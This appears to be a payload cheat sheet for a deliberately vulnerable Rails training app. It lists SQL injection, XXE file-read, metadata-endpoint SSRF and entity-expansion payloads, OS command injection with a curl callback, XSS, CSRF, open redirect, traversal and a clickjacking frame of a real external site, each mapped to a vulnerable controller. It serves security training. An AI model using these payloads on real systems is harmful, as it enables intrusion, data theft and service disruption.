# Knowledge

you can use these 💻 Payload to attack broken-rails-app

---

# SQLi

## 💻 Payload

```sql
 and 1=1
 and 1=2
'and'a'='a
'and'a'='b
'and+sleep(3)+and+'a'='a
# Time Based
```

## 🔍 Action

### products => PURCHASE

```c
[source]
app/controllers/cart_controller.rb
```

---

# XXE

## 💻 Payload

Use xml/xxe.xml for detecting XXE.

```xml
<?xml version='1.0' encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "///etc/hosts">]>
<product>
  <title>test_product</title>
  <info>&xxe;</info>
  <value>9999</value>
  <img_path>dummy0.jpg</img_path>
</product>

```

-   SSRF

```xml
<?xml version='1.0' encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<product>
  <title>test_product</title>
  <info>&xxe;</info>
  <value>9999</value>
  <img_path>dummy0.jpg</img_path>
</product>

```

-   DoS

```xml
?xml version='1.0' encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe "DoSDoSDoS">
<!ENTITY xxe1 "&xxe;&xxe;">
<!ENTITY xxe2 "&xxe1;&xxe1;">
]>
<product>
  <title>test_product</title>
  <info>&xxe2;</info>
  <value>9999</value>
  <img_path>dummy0.jpg</img_path>
</product>
```

## 🔍 Action

### New Products(admin) => Create Product

```c
[source]
app/controllers/admin/products_controller.rb
```

---

# OS command Injection

## 💻 Payload

```sh
dummy0.jpg;/bin/sleep+5
dummy0.jpg|/bin/sleep+5
dummy0.jpg|curl+http://host.docker.internal:9999;
# Listen port 9999 on local machine
```

## 🔍 Action

### products => IMAGE DOWNLOAD

```c
[source]
app/controllers/products_controller.rb
```

---

# XSS

## 💻 Payload

```html
<script>alert("xss");</script>
https://broken-rails-app.local:3000/products/1#<img%20src=x%20onerror=alert('xss')>
```

## 🔍 Action

### 1. Reveiw => SUBMIT

```c
[source]
app/views/review/_list.html.erb
```

### 2. Reveiw (Direct Access)

[JavaScript code]

```js
let currentURL = decodeURI(location.href);
let shareURL = document.querySelector("#shareURL");
shareURL.innerHTML = currentURL;
```

---

# OpenRedirect

## 💻 Payload

```html
https://broken-rails-app.local:3000/users/sign_in?redirect=https://google.com
```

---

# CSRF

## 💻 Payload

Access when you have items in your cart.

```url
https://broken-rails-app.local:3000/cart/confirm
```

POST Method forms

```html
<html>
    <body>
        <form
            action="https://broken-rails-app.local:3000/products/1/reviews"
            method="POST"
        >
            <input type="hidden" name="content" value="CSRFTEST" />
            <input type="hidden" name="product_id" value="1" />
            <input type="submit" value="Submit request" />
        </form>
    </body>
</html>
```

## 🔍 Action

### Reveiw => SUBMIT

---

# ClickJacking

## 💻 Payload

```html
<html>
    <style>
        #cj {
            width: 500;
            height: 500;
            opacity: 0.5;
        }
    </style>
    <h1>Click Jacking</h1>
    <iframe id="cj" src="https://www.blksmith.jp/contact"></iframe>
</html>
```

---

# Directory traversal

## 💻 Payload

```sh
/etc/hosts
/../../../../../../../../../etc/hosts
```

## 🔍 Action

### products => IMAGE DOWNLOAD

```c
[source]
app/controllers/products_controller.rb
```

---

# N+1 Problem

## 🔍 Action

## cart

```c
[source]
app/controllers/cart_controller.rb
```
